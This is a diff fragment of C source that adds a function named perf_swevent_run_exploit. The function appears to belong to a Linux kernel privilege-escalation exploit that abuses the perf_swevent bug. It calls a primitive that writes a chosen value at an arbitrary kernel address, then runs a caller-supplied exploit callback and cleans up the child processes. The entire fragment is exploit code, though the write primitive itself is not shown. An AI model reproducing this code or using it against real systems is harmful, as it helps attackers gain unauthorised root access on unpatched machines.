@@ -194,6 +194,27 @@ perf_swevent_reap_child_process(int number)
   free(child_process);
 }
 
+bool
+perf_swevent_run_exploit(unsigned long int address, int value,
+                         bool(*exploit_callback)(void* user_data), void *user_data)
+{
+  int number_of_children;
+  bool success;
+
+  number_of_children = perf_swevent_write_value_at_address(address, value);
+  if (number_of_children == 0) {
+    while (true) {
+      sleep(1);
+    }
+  }
+
+  success = exploit_callback(user_data);
+
+  perf_swevent_reap_child_process(number_of_children);
+
+  return success;
+}
+
 /*
 vi:ts=2:nowrap:ai:expandtab:sw=2
 */
